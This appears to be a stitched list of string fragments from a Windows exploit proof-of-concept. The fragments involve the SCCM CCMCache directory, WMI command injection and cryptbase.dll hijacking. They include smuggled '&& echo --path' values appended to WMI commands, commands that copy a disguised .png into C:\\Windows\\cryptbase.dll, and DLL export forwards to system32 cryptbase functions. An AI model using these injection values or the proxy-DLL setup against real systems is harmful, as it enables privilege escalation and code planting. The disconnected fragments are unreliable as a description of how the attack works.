"C:\\Windows\\CCMCache\\*` is one of these directories, which was appended to each wmi command like so: `&& echo --path C:\\Windows\\CCMCache\\cache`"
"C:\\Windows\\DiskSnapShot.exe && echo --path C:\\Windows\\CCMCache\\cache"")"
"C:\\Windows\\System32\\CRYPTBASE.dll""), ""SystemFunction036"");"
"C:\\Windows\\System32\\DiskSnapShot.exe C:\\Windows\\DiskSnapShot.exe && echo --path C:\\Windows\\CCMCache\\cache"")"
"C:\\Windows\\Temp\\test.exe"")"
"C:\\Windows\\cryptbase.png C:\\Windows\\cryptbase.dll && echo --path C:\\Windows\\CCMCache\\cache"")"
"C:\\Windows\\cryptbase.png"")"
"C:\\Windows\\image02.png"")"
"C:\\Windows\\image02.png"";"
"C:\\Windows\\load.exe"")"
"C:\\poc3.txt\"""" )"
"c:\\windows\\system32\\cryptbase.SystemFunction001"" @1"
"c:\\windows\\system32\\cryptbase.SystemFunction002"" @2"
"c:\\windows\\system32\\cryptbase.SystemFunction003"" @3"
"c:\\windows\\system32\\cryptbase.SystemFunction004"" @4"
"c:\\windows\\system32\\cryptbase.SystemFunction005"" @5"
"c:\\windows\\system32\\cryptbase.SystemFunction028"" @6"
"c:\\windows\\system32\\cryptbase.SystemFunction029"" @7"
"c:\\windows\\system32\\cryptbase.SystemFunction034"" @8"
"c:\\windows\\system32\\cryptbase.SystemFunction036"" @9"
"c:\\windows\\system32\\cryptbase.SystemFunction040"" @10"
"c:\\windows\\system32\\cryptbase.SystemFunction041"" @11"
"c:\\wmi2.txt\"""");"
